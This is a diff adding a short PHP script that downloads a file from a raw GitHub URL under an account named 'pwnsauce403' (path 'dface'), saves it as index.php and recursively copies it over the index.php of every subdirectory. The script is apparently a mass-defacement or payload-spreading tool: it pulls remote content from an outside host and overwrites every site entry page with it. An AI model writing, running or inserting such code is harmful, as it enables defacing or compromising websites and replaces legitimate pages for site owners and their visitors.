@@ -1,0 +1,64 @@
+<?php
+
+function downloadFile($url, $savePath) {
+    $content = file_get_contents($url);
+    if ($content === FALSE) {
+        die("Failed to download file from $url.");
+    }
+    file_put_contents($savePath, $content);
+}
+
+function uploadIndexToAllDirectories($rootDir, $sourceFile) {
+    // Ensure the root directory exists
+    if (!is_dir($rootDir)) {
+        die("Root directory $rootDir does not exist.");
+    }
+
+    // Recursive function to traverse directories
+    function traverseDirectories($dir, $sourceFile) {
+        // Open the directory
+        $items = scandir($dir);
+
+        foreach ($items as $item) {
+            // Ignore the current and parent directory links
+            if ($item === '.' || $item === '..') {
+                continue;
+            }
+
+            $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
+
+            // If it's a directory, traverse it
+            if (is_dir($fullPath)) {
+                traverseDirectories($fullPath, $sourceFile);
+
+                // Copy the index.php file to the current directory
+                $destinationFile = $fullPath . DIRECTORY_SEPARATOR . 'index.php';
+                if (!copy($sourceFile, $destinationFile)) {
+                    echo "Failed to copy $sourceFile to $destinationFile\n";
+                } else {
+                    echo "Copied $sourceFile to $destinationFile\n";
+                }
+            }
+        }
+    }
+
+    // Start traversing from the root directory
+    traverseDirectories($rootDir, $sourceFile);
+}
+
+// Automatically determine the root directory
+$rootDir = __DIR__;  // This is the directory where the script is executed
+
+// URL of the raw GitHub file
+$githubUrl = 'https://raw.githubusercontent.com/pwnsauce403/dface/main/me/readme.txt';  // Change this to the actual URL
+
+// Path to save the downloaded file as index.php
+$sourceFile = __DIR__ . '/index.php';
+
+// Download the file from GitHub
+downloadFile($githubUrl, $sourceFile);
+
+// Upload index.php to all directories and subdirectories
+uploadIndexToAllDirectories($rootDir, $sourceFile);
+
+?>
